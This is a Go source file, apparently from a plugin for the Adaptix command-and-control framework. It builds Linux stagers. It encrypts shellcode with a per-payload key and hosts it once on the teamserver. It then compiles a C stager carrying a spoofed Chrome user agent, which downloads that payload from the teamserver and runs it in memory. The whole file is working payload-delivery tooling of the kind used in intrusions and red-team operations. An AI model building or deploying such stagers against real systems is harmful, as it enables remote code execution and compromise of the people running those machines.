package main

import (
	crand "crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	adaptix "github.com/Adaptix-Framework/axc2"
)

// Productized Linux Stager (linux_agent).
// Shares file-backed /s/:token hosting semantics with beacon_agent.

const (
	linuxStagerTTL          = 24 * time.Hour
	linuxStagerCleanupEvery = 10 * time.Minute
)

var (
	linuxStagerInitOnce sync.Once
	linuxStagerInitErr  error

	linuxStagerHTTPEndpoint = func() string {
		if v := strings.TrimSpace(os.Getenv("ADAPTIX_ENDPOINT")); v != "" {
			if !strings.HasPrefix(v, "/") {
				v = "/" + v
			}
			return strings.TrimRight(v, "/")
		}
		return "/api"
	}()

	// Same contract as the Windows stager.  The /s/:token route belongs to the
	// teamserver's own HTTP endpoint, so an unset port means "unresolved" (0) and
	// generation fails loudly.  The old 8080 default named an agent listener, and
	// the stager then spoke TLS to a plaintext port and died on the target
	// without leaving a single server-side trace.
	linuxStagerTSPort = func() int {
		if v := strings.TrimSpace(os.Getenv("ADAPTIX_TEAMSERVER_PORT")); v != "" {
			if n, err := strconv.Atoi(v); err == nil && n > 0 {
				return n
			}
		}
		return 0
	}()

	// TLS is the default because the web endpoint is TLS whenever the profile
	// carries cert/key, which tls_autogen guarantees; an explicit
	// ADAPTIX_TEAMSERVER_SSL=0 selects a plaintext endpoint.  This used to be a
	// hardcoded `true`, which silently disagreed with any plaintext deployment.
	linuxStagerTSSSL = func() bool {
		switch strings.ToLower(strings.TrimSpace(os.Getenv("ADAPTIX_TEAMSERVER_SSL"))) {
		case "0", "false", "no", "off":
			return false
		}
		return true
	}()

	// External address of the teamserver endpoint.  Empty means "reuse the
	// listener's callback address", which is right when the listener and the
	// teamserver are the same host -- the usual case.
	linuxStagerTSHost = strings.TrimSpace(os.Getenv("ADAPTIX_TEAMSERVER_HOST"))
)

func linuxStagerDir() string {
	candidates := []string{"data/stager", filepath.Join("dist", "data", "stager"), "/root/AdaptixC2/dist/data/stager"}
	for _, c := range candidates {
		if err := os.MkdirAll(c, 0700); err == nil {
			return c
		}
	}
	_ = os.MkdirAll("data/stager", 0700)
	return "data/stager"
}

func linuxStagerBlobPath(token string) string {
	tok := strings.Map(func(r rune) rune {
		if (r >= '0' && r <= '9') || (r >= 'a' && r <= 'f') || (r >= 'A' && r <= 'F') {
			return r
		}
		return -1
	}, token)
	if tok == "" {
		return ""
	}
	return filepath.Join(linuxStagerDir(), tok+".bin")
}

func linuxStagerExtractToken(urlPath string) string {
	idx := strings.LastIndex(urlPath, "/s/")
	if idx < 0 {
		p := strings.Trim(urlPath, "/")
		if i := strings.LastIndex(p, "/"); i >= 0 {
			p = p[i+1:]
		}
		return p
	}
	tok := urlPath[idx+3:]
	if i := strings.IndexByte(tok, '/'); i >= 0 {
		tok = tok[:i]
	}
	return strings.TrimSpace(tok)
}

func linuxStagerCleanupExpired() {
	dir := linuxStagerDir()
	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}
	now := time.Now()
	for _, e := range entries {
		if e.IsDir() || !strings.HasSuffix(e.Name(), ".bin") {
			continue
		}
		info, err := e.Info()
		if err != nil {
			continue
		}
		if now.Sub(info.ModTime()) > linuxStagerTTL {
			_ = os.Remove(filepath.Join(dir, e.Name()))
		}
	}
}

func linuxStagerServe(w http.ResponseWriter, r *http.Request) {
	tok := linuxStagerExtractToken(r.URL.Path)
	if tok == "" {
		http.NotFound(w, r)
		return
	}
	p := linuxStagerBlobPath(tok)
	if p == "" {
		http.NotFound(w, r)
		return
	}
	st, err := os.Stat(p)
	if err != nil {
		http.NotFound(w, r)
		return
	}
	if time.Since(st.ModTime()) > linuxStagerTTL {
		_ = os.Remove(p)
		http.NotFound(w, r)
		return
	}
	data, err := os.ReadFile(p)
	if err != nil || len(data) == 0 {
		http.NotFound(w, r)
		return
	}
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Cache-Control", "no-store")
	w.Header().Set("Content-Length", strconv.Itoa(len(data)))
	_, _ = w.Write(data)
	_ = os.Remove(p)
}

func linuxStagerInitRoutes() error {
	linuxStagerInitOnce.Do(func() {
		_ = os.MkdirAll(linuxStagerDir(), 0700)
		linuxStagerInitErr = Ts.TsEndpointRegisterPublicRaw("GET", "/s/:token", linuxStagerServe)
		if linuxStagerInitErr != nil {
			linuxStagerInitErr = Ts.TsEndpointRegisterPublicRaw("GET", "/s/*token", linuxStagerServe)
		}
		go func() {
			t := time.NewTicker(linuxStagerCleanupEvery)
			defer t.Stop()
			for range t.C {
				linuxStagerCleanupExpired()
			}
		}()
		linuxStagerCleanupExpired()
	})
	return linuxStagerInitErr
}

func linuxStagerRandomToken(n int) (string, error) {
	b := make([]byte, n)
	if _, err := crand.Read(b); err != nil {
		return "", err
	}
	return hex.EncodeToString(b), nil
}

func linuxStagerRandomKey(n int) ([]byte, error) {
	b := make([]byte, n)
	if _, err := crand.Read(b); err != nil {
		return nil, err
	}
	return b, nil
}

func linuxStagerChaCha(data, key []byte) []byte {
	// Deterministic nonce derived from the per-payload random key.
	// The key is never reused across payloads, so nonce reuse is
	// impossible by construction.
	nonce := make([]byte, 12)
	for i := 0; i < 12; i++ {
		nonce[i] = key[i] ^ 0x5A
	}
	return chacha20Xor(key, nonce, data)
}

func linuxStagerKeyCLiteral(key []byte) string {
	parts := make([]string, len(key))
	for i, b := range key {
		parts[i] = fmt.Sprintf("0x%02x", b)
	}
	return strings.Join(parts, ",")
}

func linuxStagerPublish(token string, blob []byte) (string, error) {
	if err := linuxStagerInitRoutes(); err != nil {
		return "", err
	}
	p := linuxStagerBlobPath(token)
	if p == "" {
		return "", fmt.Errorf("invalid token")
	}
	if err := os.WriteFile(p, blob, 0600); err != nil {
		return "", err
	}
	return linuxStagerHTTPEndpoint + "/s/" + token, nil
}

func linuxStagerResolveHost(listenerMap map[string]any, cfg GenerateConfig) (host string, port int, useSSL bool, err error) {
	// 取值优先级（三档，与 beacon_agent/pl_stager.go 保持**同序**）：
	//   1. agent_params —— 控制台「生成载荷」表单里填的。**主路径**：所有操作员都在
	//      WebUI 上操作，这是唯一一处他们能自己改的地方。
	//   2. 进程环境变量 —— 回退，由 build_deploy.sh --up 按真正加载的 profile 注入。
	//   3. 监听器的 callback_addresses —— 只兜底 host。
	// 全都缺 ⇒ 下面硬报错。绝不静默回落 8080：那是 agent 监听器。
	port = cfg.StagerTSPort
	if port <= 0 {
		port = linuxStagerTSPort
	}
	useSSL = linuxStagerTSSSL
	if cfg.StagerTSSSL != nil {
		useSSL = *cfg.StagerTSSSL
	}

	host = strings.TrimSpace(cfg.StagerTSHost)
	if host == "" {
		host = linuxStagerTSHost
	}
	if host == "" {
		if lines, ok := listenerMap["callback_addresses"].([]interface{}); ok {
			for _, iLine := range lines {
				line, _ := iLine.(string)
				line = strings.TrimSpace(line)
				if line == "" {
					continue
				}
				h, _, e := net.SplitHostPort(line)
				if e != nil {
					host = line
				} else if h != "" {
					host = h
				}
				break
			}
		}
	}

	// Both of these used to fall back silently ("127.0.0.1", 8080), producing a
	// URL that pointed at an agent listener or at the wrong host entirely.  Say
	// what is missing instead of shipping a payload that can only fail.
	if port <= 0 {
		return "", 0, false, fmt.Errorf(
			"teamserver endpoint port is not configured: fill in the stager download endpoint on the generate form (Stager TS port), or set ADAPTIX_TEAMSERVER_PORT to Teamserver.port from the profile -- the %s route the stager downloads from is served by the teamserver itself, not by the agent listener",
			linuxStagerHTTPEndpoint+"/s/:token")
	}
	if host == "" {
		return "", 0, false, fmt.Errorf("cannot resolve a stager download host: fill in the stager download endpoint on the generate form (Stager TS host), set ADAPTIX_TEAMSERVER_HOST, or give the listener a callback_address")
	}
	return host, port, useSSL, nil
}

// linuxStagerVerifyRoute mirrors the Windows stager's build-time probe: ask the
// endpoint for a token that cannot exist.  linuxStagerServeHandler answers
// unknown tokens with 404, so a 404 proves the port, scheme and endpoint about to
// be embedded really do reach this plugin's /s/:token route.  The opposite scheme
// is tried on loopback only, because if the route answers there the mistake is
// ADAPTIX_TEAMSERVER_SSL rather than the port.
//
// Being unreachable is only a warning: the host embedded in the stager is its
// external address, which the teamserver itself may not be able to dial.
func linuxStagerVerifyRoute(builderId string, host string, port int, useSSL bool) error {
	schemeOf := func(ssl bool) string {
		if ssl {
			return "https"
		}
		return "http"
	}
	urlPath := linuxStagerHTTPEndpoint + "/s/000000000000000000000000"

	client := &http.Client{
		Timeout: 3 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	targets := []struct {
		addr    string
		schemes []bool
	}{
		{net.JoinHostPort("127.0.0.1", strconv.Itoa(port)), []bool{useSSL, !useSSL}},
		{net.JoinHostPort(host, strconv.Itoa(port)), []bool{useSSL}},
	}

	connected := false
	var lastErr error
	var lastStatus string

	for _, target := range targets {
		for i, ssl := range target.schemes {
			url := schemeOf(ssl) + "://" + target.addr + urlPath
			resp, err := client.Get(url)
			if err != nil {
				lastErr = err
				continue
			}
			connected = true
			_, _ = io.Copy(io.Discard, resp.Body)
			_ = resp.Body.Close()

			if resp.StatusCode == http.StatusNotFound {
				if i == 0 {
					return nil
				}
				want := "0"
				if ssl {
					want = "1"
				}
				return fmt.Errorf("the %s route answers over %s but not over the configured %s: set ADAPTIX_TEAMSERVER_SSL=%s", urlPath, schemeOf(ssl), schemeOf(useSSL), want)
			}
			lastStatus = fmt.Sprintf("%s returned HTTP %d", url, resp.StatusCode)
		}
	}

	if !connected {
		_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO,
			fmt.Sprintf("WARNING: could not verify the stager download URL from this host (%v) -- confirm %s://%s:%d%s is reachable from the target", lastErr, schemeOf(useSSL), host, port, urlPath))
		return nil
	}
	return fmt.Errorf("stager download URL does not reach the /s/:token route (%s); check ADAPTIX_TEAMSERVER_PORT and ADAPTIX_ENDPOINT against the Teamserver section of the profile", lastStatus)
}

func linuxStagerFindTemplate(moduleDir string) (string, error) {
	for _, c := range []string{
		filepath.Join(moduleDir, "templates", "stager_linux.c"),
		filepath.Join(moduleDir, "stager_linux.c"),
	} {
		if st, err := os.Stat(c); err == nil && !st.IsDir() {
			return c, nil
		}
	}
	return "", fmt.Errorf("stager_linux.c not found under %s", moduleDir)
}

func buildLinuxStager(builderId string, moduleDir string, tempDir string, shellcode []byte, listenerMap map[string]any, arch string, cfg GenerateConfig) ([]byte, string, error) {
	if len(shellcode) == 0 {
		return nil, "", fmt.Errorf("empty shellcode for linux stager")
	}

	host, port, useSSL, err := linuxStagerResolveHost(listenerMap, cfg)
	if err != nil {
		return nil, "", err
	}
	if err := linuxStagerVerifyRoute(builderId, host, port, useSSL); err != nil {
		return nil, "", err
	}
	key, err := linuxStagerRandomKey(16)
	if err != nil {
		return nil, "", err
	}
	token, err := linuxStagerRandomToken(12)
	if err != nil {
		return nil, "", err
	}

	enc := linuxStagerChaCha(shellcode, key)
	absPath, err := linuxStagerPublish(token, enc)
	if err != nil {
		return nil, "", err
	}

	scheme, sslLit := "http", "0"
	if useSSL {
		scheme, sslLit = "https", "1"
	}
	fullURL := fmt.Sprintf("%s://%s:%d%s", scheme, host, port, absPath)
	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Linux stager payload hosted: %s", fullURL))
	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Linux stager policy: one-shot, TTL=%s", linuxStagerTTL))
	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Linux stager exec: mmap+mprotect; inner shellcode=%d bytes arch=%s", len(shellcode), arch))

	tplPath, err := linuxStagerFindTemplate(moduleDir)
	if err != nil {
		return nil, "", err
	}
	tpl, err := os.ReadFile(tplPath)
	if err != nil {
		return nil, "", err
	}
	ua := "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
	src := string(tpl)
	src = strings.ReplaceAll(src, "@@STAGER_HOST@@", host)
	src = strings.ReplaceAll(src, "@@STAGER_PORT@@", strconv.Itoa(port))
	src = strings.ReplaceAll(src, "@@STAGER_PATH@@", absPath)
	src = strings.ReplaceAll(src, "@@STAGER_SSL@@", sslLit)
	src = strings.ReplaceAll(src, "@@STAGER_UA@@", ua)
	src = strings.ReplaceAll(src, "@@STAGER_KEY@@", linuxStagerKeyCLiteral(key))

	srcPath := filepath.Join(tempDir, "stager_linux_gen.c")
	outPath := filepath.Join(tempDir, "stager")
	if err := os.WriteFile(srcPath, []byte(src), 0600); err != nil {
		return nil, "", err
	}

	cc := "gcc"
	filename := "stager.x86_64"
	if arch == "ARM64" || arch == "aarch64" || arch == "arm64" {
		if _, err := os.Stat("/usr/bin/aarch64-linux-gnu-gcc"); err == nil {
			cc = "aarch64-linux-gnu-gcc"
		} else {
			return nil, "", fmt.Errorf("ARM64 stager requires aarch64-linux-gnu-gcc on teamserver")
		}
		filename = "stager.arm64"
	}

	args := []string{"-O2", "-s", "-o", outPath, srcPath, "-lssl", "-lcrypto"}
	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Compiling Linux stager with %s ...", cc))
	if err := Ts.TsAgentBuildExecute(builderId, tempDir, cc, args...); err != nil {
		return nil, "", fmt.Errorf("linux stager compile failed: %w", err)
	}

	bin, err := os.ReadFile(outPath)
	if err != nil {
		return nil, "", err
	}
	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_SUCCESS, fmt.Sprintf("Linux stager ready: %d bytes; URL %s", len(bin), fullURL))
	_ = Ts.TsAgentBuildLog(builderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("linux-stager-meta token=%s path=%s host=%s:%d ssl=%v ttl=%s built_at=%s",
		token, absPath, host, port, useSSL, linuxStagerTTL, time.Now().UTC().Format(time.RFC3339)))
	return bin, filename, nil
}
